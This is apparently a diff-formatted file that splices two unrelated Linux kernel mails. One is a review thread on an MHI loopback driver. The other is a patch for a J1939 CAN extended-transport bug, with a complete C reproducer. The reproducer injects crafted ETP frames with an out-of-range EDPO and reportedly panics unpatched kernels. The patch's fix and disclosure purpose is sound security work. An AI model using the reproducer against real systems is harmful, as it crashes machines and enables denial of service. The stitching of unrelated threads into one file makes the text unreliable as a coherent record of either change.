->> +			return ret;
-> Both recv_buf and send_buf are allocated with '__free' cleanup. So these buffers
-> will get freed once this function exits. But these buffer might've already
-> queued to the device in past iterations, making these pointers dangling.
->
-> Maybe you should reset the channel as you've done below for completion timeout?
-will create a reset channel function and will call that in both paths.
->
->> +		}
->> +	}
->> +
->> +	for (i = 0; i < tre_count - 1; i++) {
->> +		ret = mhi_queue_buf(loopback->mdev, DMA_TO_DEVICE,
->> +				    send_buf + (i * tre_size), tre_size, MHI_CHAIN);
->> +		if (ret) {
->> +			dev_err(dev, "Unable to queue send TRE %d: %d\n", i, ret);
->> +			return ret;
->> +		}
->> +	}
->> +
->> +	ret = mhi_queue_buf(loopback->mdev, DMA_TO_DEVICE,
->> +			    send_buf + (i * tre_size), tre_size, MHI_EOT);
->> +	if (ret) {
->> +		dev_err(dev, "Unable to queue final TRE: %d\n", ret);
->> +		return ret;
->> +	}
->> +
->> +	if (!wait_for_completion_timeout(&loopback->comp,
->> +					 msecs_to_jiffies(MHI_LOOPBACK_TIMEOUT_MS))) {
->> +		dev_err(dev, "Loopback test timed out\n");
->> +		/* Reset the channel to reclaim the TREs still pointing at the buffers */
->> +		mhi_unprepare_from_transfer(loopback->mdev);
->> +		ret = mhi_prepare_for_transfer(loopback->mdev);
->> +		if (ret)
->> +			dev_err(dev, "Failed to re-prepare channel for transfers: %d\n", ret);
->> +
->> +		return -ETIMEDOUT;
->> +	}
->> +
->> +	if (memcmp(send_buf, recv_buf, total_size)) {
->> +		dev_err(dev, "Loopback data mismatch\n");
->> +		return -EIO;
->> +	}
->> +
->> +	return count;
->> +}
->> +static DEVICE_ATTR_WO(start);
->> +
->> +static void mhi_loopback_dl_callback(struct mhi_device *mhi_dev,
->> +				     struct mhi_result *mhi_res)
->> +{
->> +	struct mhi_loopback *loopback = dev_get_drvdata(&mhi_dev->dev);
->> +
->> +	if (mhi_res->transaction_status && mhi_res->transaction_status != -ENOTCONN)
->> +		dev_err(&mhi_dev->dev, "DL callback error: status %d\n",
->> +			mhi_res->transaction_status);
->> +
->> +	if (atomic_dec_and_test(&loopback->tre_pending))
->> +		complete(&loopback->comp);
->> +}
->> +
->> +static void mhi_loopback_ul_callback(struct mhi_device *mhi_dev,
->> +				     struct mhi_result *mhi_res)
->> +{
->> +	if (mhi_res->transaction_status && mhi_res->transaction_status != -ENOTCONN)
->> +		dev_err(&mhi_dev->dev, "UL callback error: status %d\n",
->> +			mhi_res->transaction_status);
->> +}
->> +
->> +static struct attribute *mhi_loopback_attrs[] = {
->> +	&dev_attr_tre_size.attr,
->> +	&dev_attr_max_tre_size.attr,
->> +	&dev_attr_num_tre.attr,
->> +	&dev_attr_start.attr,
->> +	NULL
->> +};
->> +
->> +static const struct attribute_group mhi_loopback_group = {
->> +	.attrs = mhi_loopback_attrs,
->> +};
->> +
->> +static int mhi_loopback_probe(struct mhi_device *mhi_dev,
->> +			      const struct mhi_device_id *id)
->> +{
->> +	struct mhi_loopback *loopback;
->> +	int ret;
->> +
->> +	loopback = devm_kzalloc(&mhi_dev->dev, sizeof(*loopback), GFP_KERNEL);
->> +	if (!loopback)
->> +		return -ENOMEM;
->> +
->> +	loopback->mdev = mhi_dev;
->> +	loopback->tre_size = MHI_LOOPBACK_DEFAULT_TRE_SIZE;
->> +	loopback->num_tre = MHI_LOOPBACK_DEFAULT_NUM_TRE;
->> +
->> +	mutex_init(&loopback->lb_mutex);
->> +	init_completion(&loopback->comp);
->> +
->> +	dev_set_drvdata(&mhi_dev->dev, loopback);
->> +
->> +	ret = mhi_prepare_for_transfer(mhi_dev);
->> +	if (ret)
->> +		return dev_err_probe(&mhi_dev->dev, ret, "Failed to prepare for transfers\n");
->> +
->> +	ret = sysfs_create_group(&mhi_dev->dev.kobj, &mhi_loopback_group);
->> +	if (ret) {
->> +		dev_err(&mhi_dev->dev, "Failed to create sysfs attributes: %d\n", ret);
->> +		mhi_unprepare_from_transfer(mhi_dev);
->> +		return ret;
->> +	}
-> You can use mhi_driver->driver.dev_groups to let the driver core create sysfs
-> groups for you.
->
-> - Mani
->
+The transfer still completes normally in that case.  With
+pkt.dpo == pkt.total, a closing ETP.DT frame with dat[0] == 0 evaluates to
+packet pkt.total - 1, which is the last in-order packet, so pkt.rx reaches
+pkt.total and the receiver emits its own EOMA.  The local loopback of that
+EOMA runs j1939_session_completed(), which asks
+j1939_session_skb_get() for offset "pkt.dpo * 7" -- one full packet past
+the end of the queued skb -- gets NULL, and passes it straight to
+j1939_sk_recv(), which dereferences oskb->sk.
+
+The trigger is deterministic and needs no hardware, no race and no memory
+pressure.  Nothing on the path checks a capability: net/can has no
+CAP_NET_RAW check at all, CAN_J1939 does not require one, and the only
+capability gate nearby is SO_J1939_SEND_PRIO < 2, which asks for
+CAP_NET_ADMIN and is not needed here.  Given a CAN interface -- the vcan
+used below only has to be created once, which normally needs privileges --
+any user can reach this:
+
+  ETP.CM_RTS (size 1786)  -> total = 256 packets
+  ETP.CM_DPO (packet 0)
+  ETP.DT seq 1..255       -> packets 0..254, pkt.rx = 255
+  ETP.CM_DPO (packet 256) -> pkt.dpo = 256, unvalidated
+  ETP.DT seq 0            -> packet 255 == pkt.rx, completes the transfer
+
+resulting in:
+
+  BUG: kernel NULL pointer dereference, address: 0000000000000018
+  RIP: 0010:j1939_sk_recv+0xaf/0x150
+  Call Trace:
+   <IRQ>
+   j1939_session_completed+0x69/0x80
+   j1939_xtp_rx_eoma+0xc1/0x170
+   j1939_tp_recv+0x41b/0x4c0
+   j1939_can_recv+0x1ad/0x290
+  Kernel panic - not syncing: Fatal exception in interrupt
+
+Reject an EDPO that names a packet at or past pkt.total and abort the
+session with J1939_XTP_ABORT_BAD_EDPO_OFFSET, the SAE J1939-21 abort code
+for exactly this case.  The check has to be ">=" and not ">": pkt.total is
+a packet count, so the last valid packet is pkt.total - 1 and
+"dpo == pkt.total" is already out of range -- it is the value used by the
+trigger above.
+
+Both roles tolerate the check because a transmitter derives the offset
+from pkt.tx_acked, which is "cts_packet - 1" with cts_packet <= pkt.total,
+so the largest value it ever announces is pkt.total - 1.
+
+Also guard j1939_session_completed() against a NULL skb as defense in
+depth, so that any future regression in the offset arithmetic degrades to
+a dropped message instead of a kernel panic.  The only other caller of
+j1939_session_skb_get(), j1939_simple_txnext(), already does this.
+
+A self-contained reproducer follows below the fold.  It builds with
+"gcc -static -O2 -o j1939_dpo j1939_dpo.c", needs one vcan interface and no
+other setup, and prints the frame sequence as it injects it.  It uses a raw
+socket for the sender so it does not need a J1939 stack of its own.  On
+v7.3.0-rc5 under QEMU:
+
+  - an unpatched kernel panics 3 out of 3 runs, in j1939_sk_recv():
+      BUG: kernel NULL pointer dereference, address: 0000000000000018
+      RIP: 0010:j1939_sk_recv+0xaf/0x150
+  - with only the NULL guard in j1939_session_completed() (i.e. without
+    the EDPO range check) it still panics 3 out of 3 runs, so the guard
+    alone does not close the hole and the range check is the actual fix
+  - with this patch applied it is 0 out of 3 and the session is aborted
+    with J1939_XTP_ABORT_BAD_EDPO_OFFSET as intended
+  - a full 1786 byte ETP transfer between two J1939 sockets still
+    completes with the payload intact.  That transfer announces
+    pkt.total - 1 in its last EDPO, so it exercises the boundary value
+    one below the rejected one, and it runs the transmitter's own EDPO
+    through the vcan loopback as well.
+
+Fixes: 9d71dd0c7009 ("can: add support of SAE J1939 protocol")
+Assisted-by: LLM
+Signed-off-by: Chaosheng Qu <quchaosheng000406@163.com>
+---
+Resend: the first posting of this v2 went out without the list Cc and is
+not in the archives, so it is repeated here for the record.
+
+Changes in v2:
+ - Add the reproducer that was missing from v1.  It is self contained,
+   needs one vcan interface, and was run against three kernels: the
+   unpatched one panics 3/3, a kernel with only the NULL guard still
+   panics 3/3, and this patch gives 0/3.  The middle result is the
+   interesting one: it shows the guard alone does not close the hole, so
+   the range check is not redundant with it.
+ - Reword the reachability claim.  v1 said "unprivileged user"; the only
+   capability on the path is the one behind SO_J1939_SEND_PRIO < 2, and
+   the vcan interface itself has to exist first.  What is true is that
+   nothing in the receive path the frames take checks a capability.
+ - Resent as v2 rather than a ping: the payload of the mail changed.
+
+Reproducer (userspace, vcan only):
+
+    // SPDX-License-Identifier: GPL-2.0
+    /*
+     * net/can/j1939: ETP.CM_DPO is accepted without validation.
+     *
+     * ETP splits a transfer into windows; the sender announces each window with
+     * an ETP.CM_DPO and j1939_xtp_rx_dat_one() places data at
+     * "dat[0] - 1 + session->pkt.dpo".  pkt.dpo is therefore a window base, and a
+     * peer that sets it to pkt.total makes the *last* in-order packet land at
+     * offset pkt.total * 7 -- one packet past the end of the reassembled buffer.
+     *
+     * The packet counter still reaches pkt.total, so the transfer completes
+     * normally: the receiver schedules its own ETP.CM_EOMA, the local loopback of
+     * that EOMA is delivered to j1939_xtp_rx_eoma_one(), and
+     * j1939_session_completed() then asks j1939_session_skb_get() for offset
+     * "pkt.dpo * 7" == total * 7.  The lookup walks past the queued skb, comes up
+     * empty, and the resulting NULL is handed to j1939_sk_recv(), which
+     * dereferences it (oskb->sk).
+     *
+     * Sequence (all frames SA 0x80 -> DA 0x90, ETP.CM on PGN 0xc800):
+     *
+     *   ETP.CM_RTS (1786 bytes) -> total = 256 packets
+     *   ETP.CM_DPO (packet 0)
+     *   ETP.DT seq 1..255       -> packets 0..254, pkt.rx = 255
+     *   ETP.CM_DPO (packet 256) -> pkt.dpo = 256, unvalidated
+     *   ETP.DT seq 0            -> "0 - 1 + 256" == packet 255 == pkt.rx,
+     *                              which completes the transfer
+     *
+     * Build: gcc -static -O2 -o j1939_dpo j1939_dpo.c
+     * Run:   ip link set vcan0 up && ./j1939_dpo vcan0
+     */
+    #include <linux/can.h>
+    #include <linux/can/j1939.h>
+    #include <linux/can/raw.h>
+    #include <net/if.h>
+    #include <sys/ioctl.h>
+    #include <stdio.h>
+    #include <string.h>
+    #include <sys/socket.h>
+    #include <sys/time.h>
+    #include <unistd.h>
+
+    #define ETP_RTS	0x14
+    #define ETP_CTS	0x15
+    #define ETP_DPO	0x16
+    #define ETP_EOMA 0x17
+
+    #define PGN_ETP_CTL 0xc800
+    #define SA 0x80
+    #define DA 0x90
+
+    #define MSG_SIZE 1786
+    #define TOTAL	  ((MSG_SIZE + 6) / 7)	/* 256 */
+
+    static canid_t j1939_id(unsigned char pf, unsigned char ps, unsigned char sa)
+    {
+    	/* j1939 registers CAN_EFF_FLAG as its filter mask, so every frame on
+    	 * the bus has to be an extended (29 bit) frame.
+    	 */
+    	return CAN_EFF_FLAG | ((canid_t)6 << 26) | ((canid_t)pf << 16) |
+    	       ((canid_t)ps << 8) | sa;
+    }
+
+    static int spkt = -1;
+
+    static void send_frame(canid_t id, const unsigned char *d, int len)
+    {
+    	struct can_frame cf = { 0 };
+
+    	cf.can_id = id;
+    	cf.len = len;
+    	memcpy(cf.data, d, len);
+    	if (send(spkt, &cf, sizeof(cf), 0) != sizeof(cf))
+    		perror("send");
+    }
+
+    static int recv_frame(canid_t *id, unsigned char *d, int timeout_ms)
+    {
+    	struct can_frame cf;
+    	struct timeval tv = { timeout_ms / 1000, (timeout_ms % 1000) * 1000 };
+    	fd_set rfds;
+
+    	FD_ZERO(&rfds);
+    	FD_SET(spkt, &rfds);
+    	if (select(spkt + 1, &rfds, NULL, NULL, &tv) <= 0)
+    		return -1;
+    	if (recv(spkt, &cf, sizeof(cf), 0) != sizeof(cf))
+    		return -1;
+    	*id = cf.can_id;
+    	memcpy(d, cf.data, 8);
+    	return cf.len;
+    }
+
+    /* ETP.CM control frame: dat[5..7] always carries the PGN of the session the
+     * command belongs to, otherwise j1939_xtp_rx_cmd_bad_pgn() drops it.
+     */
+    static void ctl(unsigned char cmd, unsigned int size, unsigned int pkt)
+    {
+    	unsigned char d[8] = { 0 };
+
+    	d[0] = cmd;
+    	if (cmd == ETP_DPO) {
+    		d[2] = pkt >> 0;	/* 24 bit packet number, dat[2..4] */
+    		d[3] = pkt >> 8;
+    		d[4] = pkt >> 16;
+    	} else {
+    		d[1] = size >> 0;	/* 32 bit size, dat[1..4] */
+    		d[2] = size >> 8;
+    		d[3] = size >> 16;
+    		d[4] = size >> 24;
+    	}
+    	d[5] = PGN_ETP_CTL & 0xff;
+    	d[6] = (PGN_ETP_CTL >> 8) & 0xff;
+    	d[7] = (PGN_ETP_CTL >> 16) & 0xff;
+    	send_frame(j1939_id(0xC8, DA, SA), d, 8);
+    }
+
+    static void dt(unsigned char seq)
+    {
+    	unsigned char d[8] = { 0 };
+
+    	d[0] = seq;
+    	send_frame(j1939_id(0xC7, DA, SA), d, 8);
+    }
+
+    int main(int argc, char **argv)
+    {
+    	const char *ifname = argc > 1 ? argv[1] : "vcan0";
+    	struct sockaddr_can addr = { 0 };
+    	struct ifreq ifr = { 0 };
+    	unsigned char d[8];
+    	canid_t id;
+    	int s, i, len, cts = 0;
+
+    	/* The victim: an ordinary, correctly bound J1939 socket. */
+    	s = socket(PF_CAN, SOCK_DGRAM, CAN_J1939);
+    	if (s < 0) {
+    		perror("socket J1939");
+    		return 3;
+    	}
+    	addr.can_family = AF_CAN;
+    	addr.can_ifindex = if_nametoindex(ifname);
+    	addr.can_addr.j1939.name = J1939_NO_NAME;
+    	addr.can_addr.j1939.pgn = J1939_NO_PGN;
+    	addr.can_addr.j1939.addr = DA;
+    	if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+    		perror("bind J1939");
+    		return 3;
+    	}
+    	printf("victim: J1939 socket bound to 0x%02x on %s\n", DA, ifname);
+
+    	/* The attacker: a raw injector with an arbitrary source address. */
+    	spkt = socket(PF_CAN, SOCK_RAW, CAN_RAW);
+    	if (spkt < 0) {
+    		perror("socket RAW");
+    		return 3;
+    	}
+    	strncpy(ifr.ifr_name, ifname, sizeof(ifr.ifr_name) - 1);
+    	if (ioctl(spkt, SIOCGIFINDEX, &ifr) < 0) {
+    		perror("SIOCGIFINDEX");
+    		return 3;
+    	}
+    	addr.can_family = AF_CAN;
+    	addr.can_ifindex = ifr.ifr_ifindex;
+    	if (bind(spkt, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+    		perror("bind RAW");
+    		return 3;
+    	}
+    	printf("attacker: raw socket on %s  sa=0x%02x da=0x%02x\n",
+    	       ifname, SA, DA);
+
+    	/* 1. ETP.CM_RTS -> the receiver answers with ETP.CM_CTS. */
+    	ctl(ETP_RTS, MSG_SIZE, 0);
+    	printf("-> ETP.CM_RTS size %u (total %u packets)\n", MSG_SIZE, TOTAL);
+
+    	for (i = 0; i < 500 && !cts; i++) {
+    		len = recv_frame(&id, d, 20);
+    		if (len < 0)
+    			continue;
+    		if (d[0] == ETP_CTS) {
+    			cts = 1;
+    			printf("<- ETP.CM_CTS window %u first packet %u\n",
+    			       d[1], d[2] | (d[3] << 8) | (d[4] << 16));
+    		}
+    	}
+    	if (!cts) {
+    		printf("no CTS, aborting\n");
+    		return 4;
+    	}
+
+    	/* The vcan loopback delivers the receiver's own CTS back to its own
+    	 * receive session and j1939_xtp_rx_cts_one() stores it in
+    	 * session->last_cmd.  j1939_xtp_rx_dat_one() only accepts data when
+    	 * last_cmd is 0xff (idle), ETP.CM_DPO or a TP.CM_* value, so every
+    	 * window has to be re-opened with a DPO *after* the CTS has been
+    	 * processed, never before it.
+    	 */
+    	usleep(200000);
+
+    	/* 2. Window 1: DPO 0, then packets 0..254.  One packet is left over
+    	 *    so the transfer is still short of completion.
+    	 */
+    	ctl(ETP_DPO, 0, 0);
+    	printf("-> ETP.CM_DPO 0 (window base)\n");
+    	for (i = 0; i < TOTAL - 1; i++)
+    		dt((unsigned char)(i + 1));
+    	printf("-> ETP.DT seq 1..%u (packets 0..%u)\n", TOTAL - 1, TOTAL - 2);
+    	{
+    		int n = 0;
+    		while (n < 40 && recv_frame(&id, d, 20) >= 0) {
+    			printf("<- (drain) cmd %02x\n", d[0]);
+    			n++;
+    		}
+    		printf("<- drained %d frames, bus quiet\n", n);
+    	}
+
+    	/* 3. The vulnerable window.  pkt.dpo is peer controlled and nothing
+    	 *    validates it against pkt.total, even though
+    	 *    j1939_xtp_rx_dpo_one() has pkt.total right there.
+    	 */
+    	ctl(ETP_DPO, 0, TOTAL);
+    	printf("-> ETP.CM_DPO %u  <== pkt.dpo == pkt.total, unvalidated\n",
+    	       TOTAL);
+    	usleep(50000);
+
+    	/* 4. Closing DT.  "dat[0] - 1 + pkt.dpo" evaluates to 255 == pkt.rx,
+    	 *    the skb lookup at 255 * 7 = 1785 is still inside the buffer, so
+    	 *    the frame is accepted as the last in-order packet and pkt.rx
+    	 *    reaches pkt.total.  The receiver now sends its own EOMA, whose
+    	 *    loopback runs j1939_session_completed() with pkt.dpo == 256.
+    	 */
+    	dt(0);
+    	printf("-> ETP.DT seq 0 (packet %u, completes the transfer)\n",
+    	       TOTAL - 1);
+    	usleep(300000);
+
+    	printf("RESULT: sequence injected\n");
+    	fflush(stdout);
+    	close(s);
+    	return 0;
+    }
+
+ net/can/j1939/transport.c | 29 +++++++++++++++++++++++++----
+ 1 file changed, 25 insertions(+), 4 deletions(-)
+
+diff --git a/net/can/j1939/transport.c b/net/can/j1939/transport.c
+index 8fcfd13e5..065b4f71e 100644
+--- a/net/can/j1939/transport.c
++++ b/net/can/j1939/transport.c
+@@ -1243,9 +1243,18 @@ static void j1939_session_completed(struct j1939_session *session)
+ 
+ 	if (!session->transmission) {
+ 		se_skb = j1939_session_skb_get(session);
+-		/* distribute among j1939 receivers */
+-		j1939_sk_recv(session->priv, se_skb);
+-		consume_skb(se_skb);
++
++		/* The offset "pkt.dpo * 7" is not necessarily covered by a
++		 * queued skb, e.g. when a peer names a packet past the end of
++		 * the message in an EDPO.  j1939_simple_txnext() already
++		 * guards its call the same way; dropping the message is
++		 * better than handing a NULL skb to j1939_sk_recv().
++		 */
++		if (se_skb) {
++			/* distribute among j1939 receivers */
++			j1939_sk_recv(session->priv, se_skb);
++			consume_skb(se_skb);
++		}
+ 	}
+ 
+ 	j1939_session_deactivate_activate_next(session);
+@@ -1823,14 +1832,34 @@ static void j1939_xtp_rx_dpo_one(struct j1939_session *session,
+ 				 struct sk_buff *skb)
+ {
+ 	const u8 *dat = skb->data;
++	unsigned int dpo;
+ 
+ 	if (j1939_xtp_rx_cmd_bad_pgn(session, skb))
+ 		return;
+ 
+ 	netdev_dbg(session->priv->ndev, "%s: 0x%p\n", __func__, session);
+ 
++	dpo = j1939_etp_ctl_to_packet(dat);
++
++	/*
++	 * EDPO is peer controlled.  It names the packet the announced window
++	 * starts at, and j1939_xtp_rx_dat_one() places data at
++	 * "dat[0] - 1 + pkt.dpo", so it has to stay inside the message.  A
++	 * value past the end moves pkt.dpo beyond the reassembled buffer and
++	 * makes the ETP completion path look up offset "pkt.dpo * 7", which is
++	 * no longer covered by any queued skb.
++	 */
++	if (dpo >= session->pkt.total) {
++		netdev_warn(session->priv->ndev,
++			    "%s: 0x%p: EDPO %u out of range (total %u), aborting\n",
++			    __func__, session, dpo, session->pkt.total);
++		j1939_session_timers_cancel(session);
++		j1939_session_cancel(session, J1939_XTP_ABORT_BAD_EDPO_OFFSET);
++		return;
++	}
++
+ 	/* transmitted without problems */
+-	session->pkt.dpo = j1939_etp_ctl_to_packet(skb->data);
++	session->pkt.dpo = dpo;
+ 	session->last_cmd = dat[0];
+ 	j1939_tp_set_rxtimeout(session, 750);
+ 
 
